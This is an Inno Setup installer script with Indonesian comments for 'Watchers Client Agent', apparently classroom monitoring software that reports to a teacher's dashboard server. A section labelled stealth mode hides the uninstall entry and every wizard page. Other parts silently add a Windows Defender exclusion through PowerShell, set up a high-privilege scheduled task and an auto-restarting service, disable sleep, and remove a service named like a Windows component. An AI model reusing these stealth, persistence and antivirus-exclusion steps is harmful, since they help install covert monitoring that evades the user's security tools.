[Setup]
AppName=Watchers Client Agent
AppVersion=1.3.0
AppPublisher=Watchers Security
DefaultDirName={commonappdata}\WatchersAgent
OutputBaseFilename=WatchersAgent_SetupV20
Compression=lzma2/ultra64
SolidCompression=yes
PrivilegesRequired=admin
ArchitecturesInstallIn64BitMode=x64

; ================================================================
; KONFIGURASI TERSEMBUNYI (STEALTH MODE) & PENGUNCIAN PATH
; ================================================================
CreateUninstallRegKey=no
DisableDirPage=yes
DisableProgramGroupPage=yes
DisableWelcomePage=yes
DisableReadyPage=yes
DisableFinishedPage=yes

[Files]
; 1. Agent utama dalam bentuk Single File EXE
Source: "dist\WatchersAgent.exe"; DestDir: "{app}"; Flags: ignoreversion

; 2. File pendukung dari folder tools lokal (nssm.exe dan WatchersService.exe)
Source: "tools\nssm.exe"; DestDir: "{app}"; Flags: ignoreversion
Source: "tools\WatchersService.exe"; DestDir: "{app}"; Flags: ignoreversion

; 3. Dependency C++ Redistributable
Source: "vc_redist.x64.exe"; DestDir: "{tmp}"; Flags: deleteafterinstall

[Icons]
; Shortcut untuk Mode Pengaturan Server (--config) di folder instalasi {app}
Name: "{app}\Pengaturan Server Watchers"; Filename: "{app}\WatchersAgent.exe"; Parameters: "--config"; Comment: "Ubah Konfigurasi Server WatchersAgent"

[Run]
; 1. Instalasi VC++ Redistributable jika belum ada
Filename: "{tmp}\vc_redist.x64.exe"; Parameters: "/install /passive /norestart"; Check: not IsVCRedistInstalled; StatusMsg: "Menginstal Microsoft Visual C++..."; Flags: waituntilterminated

; 2. Tambahkan Exclusion Path ke Windows Defender
Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -NoProfile -Command Add-MpPreference -ExclusionPath '{app}'"; Flags: runhidden



[Code]
var
  ConfigPage: TWizardPage;
  ProtocolCombo: TComboBox;
  DomainEdit: TNewEdit;
  DisableSleepCheck: TNewCheckBox;

// ================================================================
// Check VC++ Installed
// ================================================================
function IsVCRedistInstalled: Boolean;
var
  Installed: Cardinal;
begin
  Result := RegQueryDWordValue(HKLM, 'SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64', 'Installed', Installed) and (Installed = 1);
  if not Result then
    Result := RegQueryDWordValue(HKLM, 'SOFTWARE\WOW6432Node\Microsoft\VisualStudio\14.0\VC\Runtimes\x64', 'Installed', Installed) and (Installed = 1);
end;

// ================================================================
// INISIALISASI HALAMAN INPUT SERVER URL & OPSI SLEEP
// ================================================================
procedure InitializeWizard();
var
  LblProtocol, LblDomain: TLabel;
begin
  ConfigPage := CreateCustomPage(wpWelcome, 'Konfigurasi Server Watchers', 'Masukkan alamat URL atau IP Server Dashboard Guru.');

  LblProtocol := TLabel.Create(ConfigPage);
  LblProtocol.Parent := ConfigPage.Surface;
  LblProtocol.Caption := 'Pilih Protokol Koneksi:';
  LblProtocol.Left := 0;
  LblProtocol.Top := 8;
  LblProtocol.Font.Style := [fsBold];

  ProtocolCombo := TComboBox.Create(ConfigPage);
  ProtocolCombo.Parent := ConfigPage.Surface;
  ProtocolCombo.Style := csDropDownList;
  ProtocolCombo.Items.Add('https://');
  ProtocolCombo.Items.Add('http://');
  ProtocolCombo.ItemIndex := 0; // Default: https://
  ProtocolCombo.Left := 0;
  ProtocolCombo.Top := LblProtocol.Top + LblProtocol.Height + 6;
  ProtocolCombo.Width := 120;

  LblDomain := TLabel.Create(ConfigPage);
  LblDomain.Parent := ConfigPage.Surface;
  LblDomain.Caption := 'Domain atau IP Server (Contoh: agent.tebaslahandev.my.id atau 192.168.1.100:8000):';
  LblDomain.Left := 0;
  LblDomain.Top := ProtocolCombo.Top + ProtocolCombo.Height + 16;
  LblDomain.Font.Style := [fsBold];

  DomainEdit := TNewEdit.Create(ConfigPage);
  DomainEdit.Parent := ConfigPage.Surface;
  DomainEdit.Text := 'watchers.tebaslahandev.my.id';
  DomainEdit.Left := 0;
  DomainEdit.Top := LblDomain.Top + LblDomain.Height + 6;
  DomainEdit.Width := ConfigPage.SurfaceWidth;

  // CHECKBOX OPSI MENCEGAH SLEEP
  DisableSleepCheck := TNewCheckBox.Create(ConfigPage);
  DisableSleepCheck.Parent := ConfigPage.Surface;
  DisableSleepCheck.Caption := 'Matikan Fitur Sleep & Sembunyikan Tombol Sleep di Start Menu';
  DisableSleepCheck.Left := 0;
  DisableSleepCheck.Top := DomainEdit.Top + DomainEdit.Height + 16;
  DisableSleepCheck.Width := ConfigPage.SurfaceWidth;
  DisableSleepCheck.Checked := True; // Default tercentang
end;

// ================================================================
// FUNGSI MATIKAN SLEEP & SEMBUNYIKAN TOMBOL SLEEP
// ================================================================
procedure ApplyNoSleepSettings();
var
  ResultCode: Integer;
begin
  // Set Timeout Layar & Standby menjadi 0 (Tidak pernah sleep)
  Exec('powercfg.exe', '/change monitor-timeout-ac 0', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('powercfg.exe', '/change standby-timeout-ac 0', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('powercfg.exe', '/change hibernate-timeout-ac 0', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // Sembunyikan Tombol "Sleep" di Start Menu / Power Menu Windows
  RegWriteDWordValue(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FlyoutMenuSettings', 'ShowSleepOption', 0);
  RegWriteDWordValue(HKLM, 'SOFTWARE\Policies\Microsoft\Windows\Explorer', 'ShowSleepOption', 0);
end;

// ================================================================
// FUNGSI PEMULIHAN PENGATURAN SLEEP
// ================================================================
procedure RestoreSleepSettings();
var
  ResultCode: Integer;
begin
  // Kembalikan Timeout Layar ke 15 Menit & Standby ke 30 Menit (Standar OS)
  Exec('powercfg.exe', '/change monitor-timeout-ac 15', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('powercfg.exe', '/change standby-timeout-ac 30', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // Tampilkan kembali Tombol "Sleep" di Start Menu Windows
  RegWriteDWordValue(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FlyoutMenuSettings', 'ShowSleepOption', 1);
  RegDeleteValue(HKLM, 'SOFTWARE\Policies\Microsoft\Windows\Explorer', 'ShowSleepOption');
end;

// ================================================================
// EKSEKUSI BERURUTAN SETELAH FILE DIEKSTRAKSI
// ================================================================
procedure CurStepChanged(CurStep: TSetupStep);
var
  ProtocolStr, DomainStr, FullUrl, ConfigPath, JsonContent: string;
  AppExePath, NssmPath, WatchersServiceExe: string;
  ResultCode: Integer;
begin
  if CurStep = ssPostInstall then
  begin
    // 1. TULIS FILE CONFIG.JSON TERLEBIH DAHULU
    if ProtocolCombo.ItemIndex = 1 then
      ProtocolStr := 'http://'
    else
      ProtocolStr := 'https://';

    DomainStr := Trim(DomainEdit.Text);

    if Pos('http://', DomainStr) = 1 then
      Delete(DomainStr, 1, 7);
    if Pos('https://', DomainStr) = 1 then
      Delete(DomainStr, 1, 8);

    FullUrl := ProtocolStr + DomainStr;
    ConfigPath := ExpandConstant('{app}\config.json');

    JsonContent := '{' + #13#10 +
                   '    "SERVER_URL": "' + FullUrl + '",' + #13#10 +
                   '    "RECONNECT_INTERVAL": 3' + #13#10 +
                   '}';

    SaveStringToFile(ConfigPath, JsonContent, False);

    // 2. TERAPKAN PENGATURAN ANTI-SLEEP JIKA CHECKBOX DICENTANG
    if DisableSleepCheck.Checked then
    begin
      ApplyNoSleepSettings();
    end;

    // Variabel Path Aplikasi
    AppExePath := ExpandConstant('{app}\WatchersAgent.exe');
    NssmPath := ExpandConstant('{app}\nssm.exe');
    WatchersServiceExe := ExpandConstant('{app}\WatchersService.exe');

    // 3. DAFTARKAN TASK SCHEDULER INTERAKTIF
    Exec('schtasks.exe', '/create /tn "WatchersAgentTask" /tr "' + AppExePath + '" /sc ONCE /st 00:00 /rl highest /f', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

    // 4. DAFTARKAN & JALANKAN WATCHERS SERVICE SETELAH CONFIG.JSON DIPASTIKAN ADA
    Exec(NssmPath, 'install WatchersService "' + WatchersServiceExe + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    Exec(NssmPath, 'set WatchersService DisplayName "Watchers Background Service"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    Exec(NssmPath, 'set WatchersService Description "Memastikan WatchersAgent tetap berjalan di Session 1."', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    Exec(NssmPath, 'set WatchersService Start SERVICE_AUTO_START', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    Exec(NssmPath, 'set WatchersService AppExit Default Restart', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    Exec(NssmPath, 'start WatchersService', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  end;
end;

// ================================================================
// FUNGSI PEMBERSIHAN UTAMA (SERVICE, TASK, REGISTRY, PROSES)
// ================================================================
procedure StopAndCleanupEverything();
var
  ResultCode: Integer;
begin
  // 1. Hentikan & hapus Service NSSM
  Exec('net.exe', 'stop WatchersService', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('sc.exe', 'delete WatchersService', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('net.exe', 'stop WinSecurityBroker', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('sc.exe', 'delete WinSecurityBroker', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // 2. Hapus Task Scheduler
  Exec('schtasks.exe', '/delete /tn "WatchersAgentTask" /f', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // 3. Matikan semua proses aktif
  Exec('taskkill.exe', '/F /T /IM WatchersService.exe /IM WatchersAgent.exe /IM nssm.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // 4. KEMBALIKAN PENGATURAN SLEEP KE NORMAL
  RestoreSleepSettings();

  Sleep(1500);
end;

function InitializeSetup(): Boolean;
var
  AppDir: string;
  ResultCode: Integer;
begin
  Result := True;
  StopAndCleanupEverything();

  AppDir := ExpandConstant('{commonappdata}\WatchersAgent');
  if DirExists(AppDir) then
  begin
    Exec('cmd.exe', '/c rmdir /s /q "' + AddQuotes(AppDir) + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  end;
end;

function InitializeUninstall(): Boolean;
begin
  Result := True;
  StopAndCleanupEverything();
end;

procedure CurUninstallStepChanged(CurUninstallStep: TUninstallStep);
var
  AppDir: string;
  ResultCode: Integer;
begin
  if CurUninstallStep = usPostUninstall then
  begin
    AppDir := ExpandConstant('{commonappdata}\WatchersAgent');
    if DirExists(AppDir) then
    begin
      Exec('cmd.exe', '/c rmdir /s /q "' + AddQuotes(AppDir) + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    end;
  end;
end;